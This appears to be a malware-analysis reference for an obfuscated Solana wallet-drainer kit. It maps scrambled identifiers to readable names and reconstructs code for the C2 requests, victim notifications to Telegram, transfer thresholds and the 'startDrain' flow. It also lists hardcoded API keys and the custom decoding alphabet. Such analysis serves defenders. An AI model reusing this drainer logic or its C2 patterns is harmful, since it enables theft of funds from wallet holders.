# Identifier Map — Deobfuscated Symbol Reference

All CJK and obfuscated identifiers resolved from the bundle.
Source: `deobf_full.js` (constants substituted, string table inlined).

---

## Infrastructure / Runtime Variables (top-level `var` declaration)

| CJK | Human Name | Type | Notes |
|-----|-----------|------|-------|
| `餢` | `strCache` | Object `{}` | Lazy-decoded string cache; `strCache[n]` holds decoded string at index n |
| `嗛` | `strTable` | Function / `Uint8Array` | Initially the encoded string table; repurposed as a loop-state var inside control-flow |
| `娨` | `getString` | `function(n)` | String accessor — decodes `strTable[n]` with the custom base64 alphabet, caches in `strCache` |
| `囉` | `CONSTS` | Array (1691 entries) | Pre-decoded constants array; integer/string values accessed as `CONSTS[n]` |
| `嬹` | `loopState` | Integer | Loop control variable (while/switch state machine) — reused across many closures |
| `齢` | `loopState2` | Integer | Second loop state variable |
| `槙` | `loopState3` | Integer | Third loop state variable |
| `杍` | `loopState4` | Integer | Fourth loop state variable |
| `镩` | `loopState5` | Integer | Fifth loop state variable |
| `腓` | `loopScope` | Object | Scope/state object for nested control-flow |
| `峟` | `noop` | `function(){}` | No-op; replaced with an empty function after first call; used to confuse static analysis |
| `樶` | `globalRef` | `function(key)` | Global scope proxy — resolves `window[key]`, `globalThis[key]`, etc. e.g. `樶("_rsxYy")` = `fetch` |

---

## remote-api Communication

| CJK | Human Name | Value / Type | Notes |
|-----|-----------|-------------|-------|
| `墸` | `C2_PATH_PREFIX` | `"ab060a03-7874-4647-84d1-da019e4b51ea"` | UUID segment prepended to every api endpoint path; disguises routes |
| `锏` | `c2Fetch` | `async function(path, params?)` | Authenticated GET to remote-api. Prepends `C2_PATH_PREFIX`, sets `User-Agent: <walletAddr>`, `Authorization: Bearer <token>`, 3.5 s timeout, `no-referrer` |
| `濛` | `generateBearer` | `function()` | Generates `"Bearer " + base64(randomBytes)` with UUID v4 bit-twiddling (bytes[1], [6], [8] fixed) |
| `搒` | `walletAddress` | `string` (initially `undefined`) | Set to wallet public key after connect; sent as `User-Agent` on every remote-api request |

### `c2Fetch` (锏) — exact reconstructed source
```js
c2Fetch = async function(path, params) {
  if (params) path += "?" + new URLSearchParams(params);
  let resp = await fetch(C2_PATH_PREFIX + path, {
    signal: AbortSignal.timeout(3500),
    referrerPolicy: "no-referrer",
    headers: {
      "User-Agent": walletAddress,        // victim's public key
      "Authorization": generateBearer()   // random UUID-ish token
    }
  });
  if (!resp.ok) throw new HttpError("20");
  return await resp.json();
};
```

### `generateBearer` (濛) — exact reconstructed source
```js
function generateBearer() {
  let ver = randomInt(1, 7);        // version nibble (1–7)
  let bytes = randomBytes(16);      // 16 random bytes
  bytes[1]  = (ver << 5) + randomInt(0, 31);  // embed version
  bytes[6]  = bytes[6] & 0x0F | 0x40;         // UUID v4 marker
  bytes[8]  = bytes[8] & 0x3F | 0x80;         // UUID variant marker
  return "Bearer " + base64Encode(bytes);       // custom alphabet base64
}
```

---

## State Machine (app state object `櫺`)

`櫺` is the central reactive state store. Key properties:

| Property | Meaning |
|---------|---------|
| `櫺["Se"]` | `walletAddress` — connected wallet public key |
| `櫺["It"]` | `connectionState` — `0`=idle, `1`=connecting, `2`=connected/transferring, `3`=error, `4`=done |
| `櫺["et"]` | `assetFlags` — bitmask: `& 1` = has SOL, `& 2` = has SPL tokens |
| `櫺["tt"]` | `solBalance` — SOL balance in lamports |
| `櫺["St"]` | `tokenInfo` — `{Oe: amount, ot: usdPrice, ze: symbol}` |
| `櫺["mn"]` | `isMainnet` — boolean |
| `櫺["c"]` | `component` — reference to the active Lit element |

---

## remote-api Notification System

| CJK | Human Name | Purpose |
|-----|-----------|---------|
| `衫` | `NOTIFY_STRINGS` | Array of 10 notification template strings (server-replaceable via `fetchLocale`) |
| `眴` | `fetchLocale` | Calls `GET /c/i` (fake-wallet backend) to replace `NOTIFY_STRINGS` with localized versions |
| `液` | `initLocale` | Calls `fetchLocale`, sets `謑=true` on success |
| `夦` | `waitForLocale` | Returns a Promise that waits up to 500 ms for locale to load |
| `謑` | `localeLoaded` | Boolean flag |
| `蕩` | `localeTimestamp` | `Date.now()` when locale was fetched |
| `狳` | `supportedLangs` | Set of 2-letter language codes the kit has translations for |

### `NOTIFY_STRINGS` (衫) — indexed content
```
[0]  "/c/i"         → remote-api connect endpoint path
[1]  "Description"  → Telegram notification field label
[2]  "/c/c/"        → remote-api transfer-start endpoint path
[3]  "/c/f/"        → remote-api transfer-complete endpoint path
[4]  "text/plain"   → Content-Type for some posts
[5]  "https://wallet-api.solflare.com/"
[6]  "v2/swap/capped-tokens?currency=USD"
[7]  "Message"      → Telegram message field label
[8]  "v3/portfolio/tokens/"
[9]  "enablePartialErrors"
```
Server can replace any of these with localized equivalents via the `fetchLocale` call.

### Notification Builders

**`蓫` buildAssetSummary()** — builds the wallet connect notification body:
```
📥 /c/i:
+ 2.3 SOL (~ $450)   ← if SOL balance present
+ 1000 USDC (~ $1000) ← if SPL tokens present
```
Falls back to `buildConnectNotif(false)` if no assets found.

**`琐` buildConnectNotif(isState3)** — connect/state3 notification:
```
​Description:  /c/c/
‌/c/f/:        ✅ text/plain
              ✅ https://wallet-api.solflare.com/
              🚫 v2/swap/capped-tokens?currency=USD
              [+ "v3/portfolio/tokens/" if isState3]
```

**`瀠` buildState4Notif()** — state 4 (complete) notification:
```
​Description:  /c/c/
‌/c/f/:        ✅ enablePartialErrors
              [+ v3/portfolio/tokens/]
```

**`醸` buildTxNotif(walletAddr)** — transaction notification with **vendor-ref watermark**:
```
Message: <walletAddr> <endpoint>
         ComputeBudget111111111111111111111111111111
         <walletAddr>
         iAAD6AMAAMb6evO+2606PWXzaqvJdDGxu+TC...
         aGV4Zm9tby5mdW4EVVNEQwAA    ← "vendor-ref" + "USDC"
         Issued At: <timestamp>
         Request ID: <random>
```
The base64 blob is a **pre-built serialized ComputeBudget + memo instruction** baked into the source — not constructed at runtime.

**`玹` buildSelectorNotif()** — dispatcher that picks the right builder based on `connectionState`:
```js
function buildSelectorNotif() {
  if (state == 4) return buildState4Notif();
  if (state == 2) return buildTxNotif(walletAddress);    // transferring
  if (state == 1 || state == 3) return buildConnectNotif(state == 3);
  return buildAssetSummary();
}
```

---

## Solana RPC Client

| CJK | Human Name | Type | Notes |
|-----|-----------|------|-------|
| `恞` | `RpcClient` | Class | Rotating RPC client with per-endpoint failover |
| `嬯` | `_endpoints` | Private | Array of RPC endpoint URLs |
| `室` | `_count` | Private | Length of endpoints array |
| `鞨` | `_index` | Private | Current endpoint index (round-robins on failure) |
| `糒` | `rpc` | Instance of `RpcClient` | Shared Solana RPC client |
| `姍` | `solana` | Proxy | `solana.<method>(...args)` → `rpc.request(method, args)` |

#### RPC Endpoints (rotation order)
```
粁[0] = "NmN3c3..." (base64 of operator addr 1) — used as auth header
粁[1] = "https://go.cb-w.com/dapp?cb_url=" + ...
粁[2] = getString(242)
粁[3] = getString(243)
粁[4] = "NmN3c3FCcW1SeTIyUWEyU0V1Wjh0V3JwS29DUzlNOFMycjhjdDhWdXFGbWo="  ← base64(addr1)
粁[5..7] = getString(245..247)
```

Helius endpoints (from decoded_strings.json):
```
getString(251) = "https://mainnet.helius-rpc.com/?api-key=0b9f580f-8102-4b89-928b-8770a62771f0"
getString(252) = "https://mainnet.helius-rpc.com/?api-key=2dfa2086-c6cd-4cb4-8a13-08ecdee36a0f"
getString(253) = "https://mainnet.helius-rpc.com/?api-key=3a1ca16d-e181-4755-9fe7-eac27579b48c"
getString(254) = "https://mainnet.helius-rpc.com/?api-key=777d85c0-fefd-42a0-b290-8b1b3704fe90"
getString(256) = "https://solana-rpc.publicnode.com/"
getString(257) = "https://solana.magiceden.dev/"
getString(258) = "https://rpc.solanatracker.io/public"
getString(259) = "https://api.mainnet-beta.solana.com"
```

RPC requests include:
```
User-Agent: <walletAddress>
Content-Type: getString(237)   = "application/json"
solana-client: getString(238)  = (Solana client version string)
```

---

## Alt Client Module (alt-backend channel)

| CJK | Human Name | Type | Notes |
|-----|-----------|------|-------|
| `听` | `FakeWalletClient` | Class | Secondary transfer channel for victims who installed a alt client app |
| `憪` | `_FWC_priv1` | Private WeakMap | First private field set |
| `饱` | `_fwcFetch` | Private method | `fetch(this.Ft(wallet, path), {signal: timeout(2500)})` — fails silently |
| `壩` | `_fwcFetchAuth` | Private method | Same but with Jupiter API key; builds URL via base64 token |
| `夾` | `fwcInstance` | Instance of `FakeWalletClient` | Global instance |

#### `听.Ft(wallet, path)` — URL builder
```js
Ft(wallet, path) {
  // wallet.Se = public key string
  // 娨(186) = "Macintosh|Mac OS X" (non-URL — intentionally fails without app)
  return getString(186) + wallet.Se + "2zC63K7VDZmL1UKHibDkMKxrAFtHjmXLm5XrPgFREgZc" + path;
}
```

#### `听.bn(wallet, path)` — JSON fetch
```js
async bn(wallet, path) {
  return (await _fwcFetch.call(this, wallet, "9kC8U8STwNtXeQqqX7WpgWg19qC7137JRP97BnLDKEtS" + path)).json();
}
```

#### `听.Tn(wallet)` — ban check (alt client variant)
```js
async Tn(wallet) {
  return (await _fwcFetch.call(this, wallet, "5o7Q69vpqP3CwSb9mVzWk2jpirYbxuntAozyBv2CURC3")).text() == "1";
}
```

Hardcoded API keys for `alt-backend`:
- `2zC63K7VDZmL1UKHibDkMKxrAFtHjmXLm5XrPgFREgZc`
- `9kC8U8STwNtXeQqqX7WpgWg19qC7137JRP97BnLDKEtS`
- `5o7Q69vpqP3CwSb9mVzWk2jpirYbxuntAozyBv2CURC3`

---

## Solflare API Client

| CJK | Human Name | Type | Notes |
|-----|-----------|------|-------|
| `汦` | `SolflareClient` | Class | Queries Solflare portfolio and token-price APIs |
| `磒` | `_SF_priv` | Private WeakMap | Private field set |
| `虹` | `solflareInstance` | Instance | Global Solflare client |

Methods:
```
Rn()          → GET price/v3?ids=   → returns SOL price in USD
Ht(query)     → GET tokens/v2/search?query=<q>  → token search
On(wallet)    → GET v2/swap/capped-tokens?currency=USD + Jupiter quote
              → returns [transactions, addressLookupTable, instructions]
Ao(w, k, v)   → GET "5f1f45eb-..." + path  → asset data (Jupiter API key)
Nn(w, path, body) → POST "a4ed32be-..." + path  → another Jupiter endpoint
```

Jupiter API keys hardcoded in this class:
- `cc0769f7-ceba-4abf-83d8-e7c083921665`
- `5f1f45eb-a550-4e95-ad0e-b26e6ec0702d`
- `a4ed32be-dcdf-4702-aba0-aee15c512427`
- `f707107a-6d56-4626-a937-ef3c7eef51d8`
- `ab060a03-7874-4647-84d1-da019e4b51ea`

---

## localStorage / State Persistence

| CJK | Human Name | Purpose |
|-----|-----------|---------|
| `召` | `ls` | `window.localStorage` reference |
| `鷺` | `store` | Wrapper object with TTL-aware get/set/remove |
| `鷺.ft(k)` | `get(k)` | JSON.parse(ls[k]) |
| `鷺.pt(k,v)` | `set(k,v)` | JSON.stringify → ls[k] |
| `鷺.wn(k)` | `getWithTTL(k)` | Returns value only if not expired; format: `"<value>|<expiry_ms>"` |
| `鷺.An(k,v,ttl)` | `setWithTTL(k,v,ttl)` | Stores with expiry: `"<v>|<now+ttl>"` |

---

## Configuration Constants

| CJK | Value | Meaning |
|-----|-------|---------|
| `惛` | `100` | Lamports-to-SOL divisor multiplier |
| `脵` | `0.5` | SOL transfer threshold (keep 0.5 SOL for fees) |
| `柳` | `8_000_000` | 8M lamports = 0.008 SOL (min transfer amount) |
| `綾` | `1_400_000` | 1.4M lamports (priority fee budget) |
| `耟` | `悎("碋",64,1024)*1024` | Compute unit limit (dynamic) |
| `斺` | `1` | Min stake account SOL to attempt unstake |
| `亊` | `3` | Max retries for transaction broadcast |
| `孨` | `"vendor-ref"` | Vendor branding string — appears in every transfer tx memo |
| `鐘` | `432_000` | Slots per epoch on Solana mainnet |
| `鲽` | `0.2` | 20% interpolation factor for slot estimation |

---

## Other Important Identifiers

| CJK | Human Name | Notes |
|-----|-----------|-------|
| `嗴` | `WalletAdapterClass` | Extends `UNW2Mva` (WalletConnect adapter) — handles wallet connect events |
| `鋭` | `_wa_priv1` | Private field |
| `璺` | `_wa_priv2` | Private field |
| `窻` | `WalletInstance` | Wraps connected wallet; `wallet.Se` = address, `wallet.Pt` = signAllTransactions |
| `鳚` | `AppContext` | Main app context combining wallet + component |
| `区` | `checkBanned` | Calls GET `/is-banned` with wallet address; returns bool |
| `涧` | `startDrain` | Main execution flow function |
| `辇` | `mountWalletSelector` | Renders wallet connection modal with injected alt clients |
| `籨` | `initApp` | Entry point — called on `window.load` event |
| `巢` | `mobileRegex` | `new RegExp("iPhone|iPad|Android")` — TDS mobile check |
| `蝧` | `solanaAddrRegex` | `/^[1-9A-HJ-NP-Za-km-z]{32,44}$/` — base58 address validator |
| `腔` | `softwareList` | Pre-built list of wallet software for the selector UI |
| `帆` | `operatorLabel` | Operator-defined label (shown in tx notification to Telegram) |
| `傶` | `isMobile` | Boolean — `mobileRegex.test(navigator.userAgent)` |
| `硭` | `usdRate` | SOL/USD exchange rate (from `SolflareClient.Rn()`) |
| `羂` | `writePos` | Buffer write position (used in base64 decoder) |
| `峽` | `bitBuffer` | Bit accumulation buffer (used in base64 decoder) |
| `荆` | `accumulator` | Byte accumulator (used in base64 decoder) |
| `晘` | `strLen` | Length of encoded string (base64 decoder) |
| `奠` | `paddingCount` | Number of `=` padding chars (base64 decoder) |
| `獡` | `bannedWallets` | `Set` of wallet addresses to never transfer (honeypot list) |
| `診` | `excludedWallets` | `Set` populated from server `setExcludedWallets` response |

---

## Obfuscation Mechanics

### String Decoding Pipeline

```
Encoded table (custom base64, 1053 entries)
        ↓  铴(table, salt1, salt2) initializes
getString(n)  →  if strCache[n] exists: return it
              →  decode strTable[n] using custom base64 alphabet
              →  store in strCache[n]
              →  return string
```

Custom base64 alphabet (char code → 6-bit value):
```
'+':21  '/':9   '0':33  '1':62  '2':19  '3':16  '4':50  '5':27
'6':14  '7':47  '8':23  '9':1   'A':2   'B':44  'C':35  'D':30
'E':29  'F':55  'G':25  'H':18  'I':41  'J':61  'K':8   'L':24
'M':63  'N':60  'O':20  'P':4   'Q':43  'R':31  'S':54  'T':42
'U':46  'V':5   'W':22  'X':36  'Y':34  'Z':39  'a':48  'b':17
'c':45  'd':0   'e':12  'f':57  'g':59  'h':26  'i':58  'j':11
'k':28  'l':13  'm':49  'n':3   'o':10  'p':40  'q':37  'r':52
's':53  't':15  'u':7   'v':38  'w':51  'x':32  'y':6   'z':56
```

### Control-Flow Flattening

Every non-trivial function is wrapped in a `while(true) { switch(state) { ... } }` loop where `state` is the sum of two variables (`嗛` and `嬹`). Each `case` is a linear code block that sets the new state values before `break`. Decompiling requires tracing which `case` values are reachable.

### globalRef (樶) — runtime symbol resolution

`樶("key")` resolves globals by string key to defeat static analysis:
```
樶("_rsxYy")     = fetch
樶("IvYJLN"+"u") = Error
樶("UItOUF"+"E") = Uint8Array
樶("ZWr0oF")     = JSON
樶("LHahIK")     = Date
樶("kAiDhH")     = AbortSignal
樶("GD26ws")     = Math
樶("tH_xEL"+"D") = Array
樶("RvIyOH")     = URLSearchParams
樶("cfGHUW")     = window
樶("K3hpCP")     = WeakMap
樶("HrGoQP")     = WeakMap (second instance)
樶("UwDST9"+"h") = RegExp constructor
樶("q9Tsem"+"V") = Proxy constructor
樶("CKWkr4"+"F") = Set constructor
樶("xWfJJz")     = console
樶("JIzCVd")     = navigator
```
